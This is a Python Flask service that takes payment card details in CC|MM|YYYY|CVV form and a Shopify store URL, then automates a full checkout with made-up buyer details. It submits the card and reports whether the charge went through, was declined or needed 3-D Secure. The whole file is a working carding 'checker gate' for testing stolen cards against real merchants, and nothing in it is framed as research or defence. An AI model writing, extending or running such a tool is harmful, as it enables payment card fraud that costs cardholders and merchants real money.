import os
import time
import random
import asyncio
import aiohttp
from flask import Flask, request, jsonify

app = Flask(__name__)

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Accept": "application/json, text/plain, */*",
    "Accept-Language": "en-US,en;q=0.9",
    "Connection": "keep-alive",
}

async def shopify_check(cc, mm, yy, cvv, site):
    start = time.time()
    site = site.rstrip("/")

    try:
        timeout = aiohttp.ClientTimeout(total=60)
        connector = aiohttp.TCPConnector(ssl=False)

        async with aiohttp.ClientSession(
            headers=HEADERS,
            connector=connector,
            timeout=timeout
        ) as session:

            # Step 1: Get product + variant
            async with session.get(f"{site}/products.json?limit=1") as resp:
                body = await resp.text()
                try:
                    products = await resp.json(content_type=None)
                except Exception:
                    import json
                    products = json.loads(body)

                if not products.get("products"):
                    return _err("NO_PRODUCTS", start)

                variant_id = products["products"][0]["variants"][0]["id"]
                price_cents = products["products"][0]["variants"][0].get("price", "1.00")

            # Step 2: Add to cart
            async with session.post(
                f"{site}/cart/add.js",
                json={"items": [{"id": variant_id, "quantity": 1}]},
                headers={**HEADERS, "Content-Type": "application/json"}
            ) as resp:
                body = await resp.text()
                if resp.status != 200:
                    return _err(f"CART_FAILED_{resp.status}", start)
                try:
                    import json
                    cart = json.loads(body)
                    price = str(round(int(cart.get("price", cart.get("items", [{}])[0].get("price", 100))) / 100, 2))
                except Exception:
                    price = str(price_cents)

            # Step 3: Get checkout URL
            async with session.get(
                f"{site}/checkout",
                allow_redirects=True
            ) as resp:
                checkout_url = str(resp.url)
                checkout_text = await resp.text()

            if "/checkouts/" not in checkout_url:
                return _err("CHECKOUT_FAILED", start)

            checkout_token = checkout_url.split("/checkouts/")[-1].split("?")[0]

            # Extract authenticity token
            auth_token = ""
            if 'name="authenticity_token"' in checkout_text:
                try:
                    auth_token = checkout_text.split('name="authenticity_token" value="')[1].split('"')[0]
                except Exception:
                    pass

            # Step 4: Contact info
            contact_data = {
                "_method": "patch",
                "authenticity_token": auth_token,
                "previous_step": "contact_information",
                "step": "shipping_method",
                "checkout[email]": f"john{random.randint(1000,9999)}@gmail.com",
                "checkout[shipping_address][first_name]": "John",
                "checkout[shipping_address][last_name]": "Smith",
                "checkout[shipping_address][address1]": "123 Main St",
                "checkout[shipping_address][city]": "New York",
                "checkout[shipping_address][country]": "United States",
                "checkout[shipping_address][province]": "New York",
                "checkout[shipping_address][zip]": "10001",
                "checkout[shipping_address][phone]": "5551234567",
            }

            async with session.post(
                f"{site}/checkouts/{checkout_token}",
                data=contact_data,
                allow_redirects=True,
                headers={**HEADERS, "Content-Type": "application/x-www-form-urlencoded"}
            ) as resp:
                shipping_text = await resp.text()
                shipping_url = str(resp.url)

            # Extract shipping rate
            shipping_rate = "shopify-Standard%20Shipping-0.00"
            if 'data-shipping-method' in shipping_text:
                try:
                    rate_raw = shipping_text.split('data-shipping-method="')[1].split('"')[0]
                    import urllib.parse
                    shipping_rate = urllib.parse.quote(rate_raw, safe='')
                except Exception:
                    pass

            # Step 5: Shipping method
            shipping_data = {
                "_method": "patch",
                "authenticity_token": auth_token,
                "previous_step": "shipping_method",
                "step": "payment_method",
                "checkout[shipping_rate][id]": shipping_rate,
            }

            async with session.post(
                f"{site}/checkouts/{checkout_token}",
                data=shipping_data,
                allow_redirects=True,
                headers={**HEADERS, "Content-Type": "application/x-www-form-urlencoded"}
            ) as resp:
                payment_page = await resp.text()

            # Extract fresh auth token from payment page
            if 'name="authenticity_token"' in payment_page:
                try:
                    auth_token = payment_page.split('name="authenticity_token" value="')[1].split('"')[0]
                except Exception:
                    pass

            # Detect gateway
            gateway = "Shopify Payments"
            if "stripe" in payment_page.lower():
                gateway = "Stripe"
            elif "braintree" in payment_page.lower():
                gateway = "Braintree"

            # Normalize year
            yy_full = yy if len(str(yy)) == 4 else f"20{yy}"

            # Step 6: Submit payment
            payment_data = {
                "_method": "patch",
                "authenticity_token": auth_token,
                "previous_step": "payment_method",
                "step": "",
                "checkout[credit_card][number]": cc,
                "checkout[credit_card][name]": "John Smith",
                "checkout[credit_card][month]": mm,
                "checkout[credit_card][year]": yy_full,
                "checkout[credit_card][verification_value]": cvv,
            }

            async with session.post(
                f"{site}/checkouts/{checkout_token}",
                data=payment_data,
                allow_redirects=True,
                headers={**HEADERS, "Content-Type": "application/x-www-form-urlencoded"}
            ) as resp:
                result_text = await resp.text()
                result_url = str(resp.url)

            elapsed = round(time.time() - start, 1)
            result_lower = result_text.lower()

            if "thank_you" in result_url or "thank-you" in result_url or "orders" in result_url:
                return _ok("ORDER_PLACED", gateway, price, "True", "True", elapsed)
            elif "insufficient" in result_lower:
                return _ok("INSUFFICIENT_FUNDS", gateway, price, "False", "True", elapsed)
            elif "3d secure" in result_lower or "3ds" in result_lower or "authentication required" in result_lower:
                return _ok("3DS_REQUIRED", gateway, price, "False", "False", elapsed)
            elif "declined" in result_lower or "card was declined" in result_lower:
                return _ok("CARD_DECLINED", gateway, price, "False", "False", elapsed)
            elif "payment" in result_url and "checkouts" in result_url:
                return _ok("CARD_DECLINED", gateway, price, "False", "False", elapsed)
            else:
                # Debug: return URL + snippet to understand response
                snippet = result_text[:200].replace("\n", " ").replace("\r", "")
                return _ok(f"UNKNOWN|URL:{result_url[:80]}|HTML:{snippet}", gateway, price, "False", "False", elapsed)

    except asyncio.TimeoutError:
        return _err("TIMEOUT", start)
    except Exception as e:
        return _err(f"ERROR_{str(e)[:40]}", start)


def _ok(response, gate, price, charged, approved, elapsed):
    return {
        "success": charged == "True",
        "Response": response,
        "Gate": gate,
        "Price": f"{price} USD",
        "Charged": charged,
        "Approved": approved,
        "Time": f"{elapsed}s"
    }

def _err(msg, start):
    return {
        "success": False,
        "Response": msg,
        "Gate": "Shopify",
        "Price": "0",
        "Charged": "False",
        "Approved": "False",
        "Time": f"{round(time.time()-start, 1)}s"
    }


@app.route("/", methods=["GET"])
def check():
    card = request.args.get("card", "")
    site = request.args.get("site", "")

    if not card:
        return jsonify({"success": False, "message": "Missing card parameter. Use: ?card=CC|MM|YYYY|CVV"})
    if not site:
        return jsonify({"success": False, "message": "Missing site parameter. Use: &site=https://store.myshopify.com"})

    parts = card.split("|")
    if len(parts) != 4:
        return jsonify({"success": False, "message": "Invalid card format. Use: CC|MM|YYYY|CVV"})

    cc, mm, yy, cvv = parts

    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        result = loop.run_until_complete(shopify_check(cc, mm, yy, cvv, site))
    finally:
        loop.close()

    return jsonify(result)


@app.route("/health", methods=["GET"])
def health():
    return jsonify({"status": "ok", "message": "Shopify Node Running"})


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=False)
